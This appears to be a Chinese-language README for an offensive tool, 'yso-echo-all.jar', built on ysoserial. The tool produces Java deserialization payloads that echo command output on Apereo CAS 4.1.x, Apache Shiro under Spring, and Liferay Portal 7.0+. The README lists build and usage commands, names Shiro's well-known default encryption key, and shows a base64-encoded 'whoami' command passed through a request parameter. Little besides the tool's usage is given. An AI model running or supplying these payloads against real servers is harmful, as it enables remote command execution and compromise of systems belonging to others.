# 回显某些框架和场景下的反序列化利用 

## 0x01 Introduce

1. Request/Response回显
2. 支持win和linux payload
2. base64编码

## 0x02 Support
1. ApereoCAS 4.1.X 默认密钥
2. Shiro spring 环境下回显
3. Liferay protal 7.0 以上

## 0x02 Buiding

```mvn clean package -DskipTests```

## 0x03 Usage

```
Usage: java -jar yso-echo-all.jar [payload] win
Usage: java -jar yso-echo-all.jar [payload] linux

Usage: java -jar yso-echo-all.jar shiro_CommonsBeanutils1 win [key default kPH+bIxk5D2deZiIxcaaaA==]
Usage: java -jar yso-echo-all.jar shiro_CommonsBeanutils1 win kPH+bIxk5D2deZiIxcaaaA==
Usage: java -jar yso-echo-all.jar liferay_CommonsBeanutils1 linux
Usage: java -jar yso-echo-all.jar apereo_CommonsCollections2 linux

[Add Request get/post parameter] c=d2hvYW1p (whoami)
在get post 参数中加入 c=d2hvYW1p (whoami)
```

## 0x04 Screenshot

shiro spring环境回显
![shiro_spring_env.png](./screenshot/shiro_spring_env.png)

## 0x05 Reference
* https://github.com/frohoff/ysoserial
* https://www.freebuf.com/vuls/226149.html
* https://www.00theway.org/2020/01/04/apereo-cas-rce/